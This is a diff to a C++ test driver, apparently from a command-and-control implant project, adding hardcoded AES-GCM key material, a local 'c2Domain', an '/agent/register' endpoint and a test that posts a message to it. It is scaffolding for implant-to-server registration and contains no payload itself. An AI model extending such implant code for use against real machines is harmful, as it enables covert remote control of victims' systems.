@@ -1,6 +1,15 @@
 #include "exec_shell.h"
 #include "aes_gcm.h"
+#include "http.h"
 #include <iostream>
+
+BYTE textIV[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1};
+BYTE key[] = {0x41, 0x13, 0xcd, 0xa3, 0xa0, 0xe0, 0xab, 0x5e, 0x19, 0xf1, 0xc0, 0x1c, 0x6d, 0x4e, 0x77, 0xc5, 0xe5, 0x20, 0xd2, 0x44, 0xe, 0x52, 0xae, 0x87, 0xaa, 0xa, 0x96, 0x67, 0x28, 0x82, 0xea, 0x8};
+LPCWSTR c2Domain = L"127.0.0.1";
+LPCWSTR registerURI = L"/agent/register";
+LPCWSTR testURI = L"test";
+std::string password = "password";
+int port = 5000;
 
 // helper function to print a byte array
 void printHexArray(BYTE* data, int len) {
@@ -65,10 +74,20 @@ void test_aesgcm() {
     delete box;
 }
 
+void test_http() {
+    std::string message = "test message";
+
+    std::string response = httpPost(c2Domain, port, registerURI, message);
+
+    std::cout << response << std::endl;
+
+}
+
 int main(int argc, char* argv[])
 {   
     if (argc != 2) {
         std::cout << "specify which test to run" << std::endl;
+        return 0;
     }
 
     std::string test_name = std::string(argv[1]);
